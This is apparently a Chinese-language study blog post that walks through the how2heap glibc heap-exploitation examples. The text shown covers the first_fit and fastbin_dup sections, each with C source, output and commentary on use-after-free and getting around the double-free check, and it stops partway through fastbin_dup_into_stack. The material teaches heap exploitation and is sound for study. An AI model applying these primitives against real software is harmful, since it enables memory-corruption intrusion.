<!doctype html><html lang=zh dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta http-equiv=content-language content="zh-cn"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="rgb(255,255,255)"><meta http-equiv=x-ua-compatible content="ie=edge"><title>how2heap 学习 &#183; Lab on Mercury</title><meta name=title content="how2heap 学习 &#183; Lab on Mercury"><meta name=description content="距离文章发布两个多月后，终于更新完啦！"><link rel=canonical href=https://blog.sigmerc.top/posts/how2heap/><link type=text/css rel=stylesheet href=/css/main.bundle.min.a0c401e48d53b1e212abf40187caba7e826ef5d05042554c86993578bb0238c0306d206aa72dbfbd4e3188389d731e32454d10828845ed91739918d38d23a3cc.css integrity="sha512-oMQB5I1TseISq/QBh8q6foJu9dBQQlVMhpk1eLsCOMAwbSBqpy2/vU4xiDidcx4yRU0QgohF7ZFzmRjTjSOjzA=="><script type=text/javascript src=/js/appearance.min.1e44157c1e51b46341ce2c94716dd3dd1ef30c28e7d1c9f3b9db80877bfe72bc66b00d8a662f317840016acbed93c5f18c3d9268c8b957021ee74d0b04adf6c5.js integrity="sha512-HkQVfB5RtGNBziyUcW3T3R7zDCjn0cnzuduAh3v+crxmsA2KZi8xeEABasvtk8XxjD2SaMi5VwIe500LBK32xQ=="></script>
<script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.6d78c827ca7bcbf72056dbf698bf9aeb759a08966686187deb23f5949f73eca5f39b461284900cdfc08e2976d99eb80a8663648de778ba2a83e633ae16dbfc25.js integrity="sha512-bXjIJ8p7y/cgVtv2mL+a63WaCJZmhhh96yP1lJ9z7KXzm0YShJAM38COKXbZnrgKhmNkjed4uiqD5jOuFtv8JQ==" data-copy=Copy data-copied=Copied></script>
<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:title" content="how2heap 学习"><meta property="og:description" content="距离文章发布两个多月后，终于更新完啦！"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/posts/how2heap/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-12-09T14:36:48+00:00"><meta property="article:modified_time" content="2022-09-11T10:36:39+08:00"><meta property="og:site_name" content="Lab on Mercury"><meta name=twitter:card content="summary"><meta name=twitter:title content="how2heap 学习"><meta name=twitter:description content="距离文章发布两个多月后，终于更新完啦！"><script type=application/ld+json>[{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"how2heap 学习","headline":"how2heap 学习","abstract":"\u003cp\u003e距离文章发布两个多月后，终于更新完啦！\u003c\/p\u003e","inLanguage":"zh-cn","url":"https:\/\/blog.sigmerc.top\/posts\/how2heap\/","author":{"@type":"Person","name":"Mercury"},"copyrightYear":"2019","dateCreated":"2019-12-09T14:36:48\u002b00:00","datePublished":"2019-12-09T14:36:48\u002b00:00","dateModified":"2022-09-11T10:36:39\u002b08:00","keywords":["堆漏洞"],"mainEntityOfPage":"true","wordCount":"13909"}]</script><meta name=author content="Mercury"><link href=mailto:signormercurio@gmail.com rel=me><link href=https://github.com/SignorMercurio rel=me><link href=https://t.me/m9r_at_tG rel=me></head><body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"><div id=the-top class="absolute flex self-center"><a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a></div><header class="py-6 font-semibold sm:py-10 text-neutral-900 dark:text-neutral print:hidden"><nav class="flex justify-between"><div><span class="relative inline-block align-text-bottom icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><path fill="currentcolor" d="M112.1 454.3c0 6.297 1.816 12.44 5.284 17.69l17.14 25.69c5.25 7.875 17.17 14.28 26.64 14.28h61.67c9.438.0 21.36-6.401 26.61-14.28l17.08-25.68c2.938-4.438 5.348-12.37 5.348-17.7L272 415.1H112L112.1 454.3zM191.4.0132C89.44.3257 16 82.97 16 175.1c0 44.38 16.44 84.84 43.56 115.8 16.53 18.84 42.34 58.23 52.22 91.45.0313.25.0938.5166.125.7823h160.2c.0313-.2656.0938-.5166.125-.7823 9.875-33.22 35.69-72.61 52.22-91.45C351.6 260.8 368 220.4 368 175.1 368 78.61 288.9-.2837 191.4.0132zM192 96.01c-44.13.0-80 35.89-80 79.1.0 9.69-7.2 16.89-16 16.89S80 184.8 80 176c0-61.76 50.25-111.1 112-111.1 8.844.0 16 7.159 16 16S200.8 96.01 192 96.01z"/></svg></span><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" rel=me href=/>Lab on Mercury</a></div><ul class="flex flex-col list-none ltr:text-right rtl:text-left sm:flex-row"><li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/posts/ title=Posts>文章</a></li><li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/categories/ title=Categories>分类</a></li><li class="mb-1 sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href=/tags/ title=Tags>标签</a></li><li class="ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><button id=search-button class="text-base hover:text-primary-600 dark:hover:text-primary-400" title="Search (/)">
<span class="relative inline-block align-text-bottom icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></button></li></ul></nav></header><div class="relative flex flex-col grow"><main id=main-content class=grow><article><header class=max-w-prose><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/>Lab on Mercury</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class="inline hidden"><a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href=/posts/how2heap/>how2heap 学习</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">how2heap 学习</h1><div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime="2019-12-09 14:36:48 +0000 UTC">2019-12-09</time><span class="px-2 text-primary-500">&#183;</span><time datetime="2022-09-11 10:36:39 +0800 +0800">Updated: 2022-09-11</time></div><div class="my-1 text-xs text-neutral-500 dark:text-neutral-400"><a href=/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/ class="rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">二进制安全</a>
<a href=/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/ class="rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">堆漏洞</a></div></div></header><section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert"><div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last"><div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden"><details open class="mt-0 sideNav rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3"><summary class="block sticky top-0 py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700">Table of Contents</summary><div class="py-2 pr-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#first_fit>first_fit</a></li><li><a href=#fastbin_dup>fastbin_dup</a></li><li><a href=#fastbin_dup_into_stack>fastbin_dup_into_stack</a></li><li><a href=#fastbin_dup_consolidate>fastbin_dup_consolidate</a></li><li><a href=#unsafe_unlink>unsafe_unlink</a></li><li><a href=#house_of_spirit>house_of_spirit</a></li><li><a href=#poison_null_byte>poison_null_byte</a></li><li><a href=#house_of_lore>house_of_lore</a></li><li><a href=#overlapping_chunks>overlapping_chunks</a></li><li><a href=#overlapping_chunks_2>overlapping_chunks_2</a></li><li><a href=#house_of_force>house_of_force</a></li><li><a href=#unsorted_bin_into_stack>unsorted_bin_into_stack</a></li><li><a href=#unsorted_bin_attack>unsorted_bin_attack</a></li><li><a href=#large_bin_attack>large_bin_attack</a></li><li><a href=#house_of_einherjar>house_of_einherjar</a></li><li><a href=#house_of_orange>house_of_orange</a></li><li><a href=#calc_tcache_size>calc_tcache_size</a></li><li><a href=#tcache_dup>tcache_dup</a></li><li><a href=#tcache_poisoning>tcache_poisoning</a></li><li><a href=#tcache_house_of_spirit>tcache_house_of_spirit</a></li><li><a href=#house_of_botcake>house_of_botcake</a></li></ul></nav></div></details></div></div><div class="min-w-0 min-h-0 max-w-prose"><p>距离文章发布两个多月后，终于更新完啦！</p><h2 id=first_fit class="relative group">first_fit <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#first_fit aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s allocator.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;glibc uses a first-fit algorithm to select a free chunk.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If a chunk is free and large enough, malloc will select this chunk.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This can be exploited in a use-after-free situation.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating 2 buffers. They can be large, don&#39;t have to be fastbin.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>a</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x512</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>b</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>c</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(0x512): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(0x256): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;we could continue mallocing here...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;now let&#39;s put a string at a that we can read later </span><span class=se>\&#34;</span><span class=s>this is A!</span><span class=se>\&#34;\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=s>&#34;this is A!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;first allocation %p points to %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the first one...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;We don&#39;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;So, let&#39;s allocate 0x500 bytes</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>c</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mh>0x500</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd malloc(0x500): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;And put a different string here, </span><span class=se>\&#34;</span><span class=s>this is C!</span><span class=se>\&#34;\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>strcpy</span><span class=p>(</span><span class=n>c</span><span class=p>,</span><span class=s>&#34;this is C!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd allocation %p points to %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;first allocation %p points to %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If we reuse the first allocation, it now holds the data from the third allocation.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s allocator.
glibc uses a first-fit algorithm to select a free chunk.
If a chunk is free and large enough, malloc will select this chunk.
This can be exploited in a use-after-free situation.
Allocating 2 buffers. They can be large, don&#39;t have to be fastbin.
1st malloc(0x512): 0x121f010
2nd malloc(0x256): 0x121f530
we could continue mallocing here...
now let&#39;s put a string at a that we can read later&#34;this is A!&#34;
first allocation 0x121f010 points to this is A!
Freeing the first one...
We don&#39;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x121f010
So, let&#39;s allocate 0x500 bytes
3rd malloc(0x500): 0x121f010
And put a different string here, &#34;this is C!&#34;
3rd allocation 0x121f010 points to this is C!
first allocation 0x121f010 points to this is C!
If we reuse the first allocation, it now holds the data from the third allocation.
</code></pre><p>这个例子很简单，由于初始分配给 <code>a</code> 的 <code>0x512</code> 字节刚刚被释放，此时分配一块小于 <code>0x512</code> 字节的内存必定会使用刚才 <code>a</code> 使用的内存区域。注意如果最后使用被释放的指针 <code>a</code>，那么它仍然指向 <code>this is C!</code> 字符串，这就是通常说的 <code>use after free</code>。</p><h2 id=fastbin_dup class="relative group">fastbin_dup <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#fastbin_dup aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file demonstrates a simple double-free attack with fastbins.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating 3 buffers.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=o>*</span><span class=n>b</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=o>*</span><span class=n>c</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the first one...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;If we free %p again, things will crash because %p is at the top of the free list.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// free(a);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;So, instead, we&#39;ll free %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we can free %p again, since it&#39;s not the head of the free list.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>free</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now the free list has [%p, %p, %p]. If we malloc 3 times, we&#39;ll get %p twice!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=n>a</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>输出：</p><pre tabindex=0><code>This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0x17e9010
2nd malloc(8): 0x17e9030
3rd malloc(8): 0x17e9050
Freeing the first one...
If we free 0x17e9010 again, things will crash because 0x17e9010 is at the top of the free list.
So, instead, we&#39;ll free 0x17e9030.
Now, we can free 0x17e9010 again, since it&#39;s not the head of the free list.
Now the free list has [0x17e9010, 0x17e9030, 0x17e9010]. If we malloc 3 times, we&#39;ll get 0x17e9010 twice!
1st malloc(8): 0x17e9010
2nd malloc(8): 0x17e9030
3rd malloc(8): 0x17e9010
</code></pre><p>这里如果释放 <code>a</code> 后再释放它一次，由于它位于 freelist 顶端过不了安全检查，得到：</p><pre tabindex=0><code>*** Error in `./a.out&#39;: double free or corruption (fasttop): 0x00000000007aa010 ***
</code></pre><p>这就是我们说的 <code>double free</code>。然而我们第一次释放 <code>a</code> 后如果先释放另一个块 <code>b</code>，那么 <code>b</code> 就会位于 freelist 顶部，此时再次释放 <code>a</code> 就可以绕过 <code>double free</code> 的检测。这样做的结果是最后第一次和第三次 <code>malloc</code> 得到的两个不同指针指向了相同的地址。</p><h2 id=fastbin_dup_into_stack class="relative group">fastbin_dup_into_stack <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#fastbin_dup_into_stack aria-label=锚点>#</a></span></h2><p>源码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;This file extends on fastbin_dup.c by tricking malloc into</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>           <span class=s>&#34;returning a pointer to a controlled location (in this case, the stack).</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=n>stack_var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The address we want malloc() to return is %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>8</span><span class=o>+</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>stack_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating 3 buffers.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=o>*</span><span class=n>a</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=o>*</span><span class=n>b</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=o>*</span><span class=n>c</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;1st malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;2nd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;3rd malloc(8): %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Freeing the first one...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
